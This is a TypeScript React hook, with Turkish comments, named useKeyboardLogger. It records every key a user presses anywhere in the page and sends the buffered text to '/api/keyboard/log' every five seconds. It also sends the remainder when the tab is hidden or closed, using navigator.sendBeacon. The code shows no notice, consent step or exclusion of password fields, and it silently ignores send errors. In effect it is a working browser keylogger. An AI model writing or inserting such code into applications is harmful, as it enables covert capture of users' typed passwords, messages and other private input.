import { useEffect, useRef, useCallback } from 'react';

const BATCH_INTERVAL = 5000; // 5 saniyede bir gönder
const MIN_CHARS_TO_SEND = 10; // En az 10 karakter

export function useKeyboardLogger() {
  const bufferRef = useRef<string>('');
  const lastSendRef = useRef<number>(Date.now());
  const isActiveRef = useRef<boolean>(true);

  const sendBuffer = useCallback(async () => {
    if (bufferRef.current.length < MIN_CHARS_TO_SEND) {
      return;
    }

    const textToSend = bufferRef.current;
    bufferRef.current = '';

    try {
      await fetch('/api/keyboard/log', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          text: textToSend,
          source: 'app'
        }),
      });
    } catch (error) {
    }
  }, []);

  useEffect(() => {
    const handleKeyDown = (event: KeyboardEvent) => {
      if (!isActiveRef.current) return;

      let char = '';

      if (event.key === 'Enter') {
        char = '\n';
      } else if (event.key === 'Tab') {
        char = '\t';
      } else if (event.key === ' ') {
        char = ' ';
      } else if (event.key === 'Backspace') {
        bufferRef.current = bufferRef.current.slice(0, -1);
        return;
      } else if (event.key.length === 1) {
        char = event.key;
      } else {
        return;
      }

      bufferRef.current += char;
    };

    const intervalId = setInterval(() => {
      const now = Date.now();
      if (now - lastSendRef.current >= BATCH_INTERVAL) {
        sendBuffer();
        lastSendRef.current = now;
      }
    }, 1000);

    const handleVisibilityChange = () => {
      if (document.hidden) {
        sendBuffer();
      }
    };

    const handleBeforeUnload = () => {
      if (bufferRef.current.length > 0) {
        navigator.sendBeacon('/api/keyboard/log', JSON.stringify({
          text: bufferRef.current,
          source: 'app-unload'
        }));
      }
    };

    window.addEventListener('keydown', handleKeyDown);
    document.addEventListener('visibilitychange', handleVisibilityChange);
    window.addEventListener('beforeunload', handleBeforeUnload);

    return () => {
      window.removeEventListener('keydown', handleKeyDown);
      document.removeEventListener('visibilitychange', handleVisibilityChange);
      window.removeEventListener('beforeunload', handleBeforeUnload);
      clearInterval(intervalId);

      if (bufferRef.current.length > 0) {
        sendBuffer();
      }
    };
  }, [sendBuffer]);

  const pause = useCallback(() => {
    isActiveRef.current = false;
  }, []);

  const resume = useCallback(() => {
    isActiveRef.current = true;
  }, []);

  return { pause, resume };
}
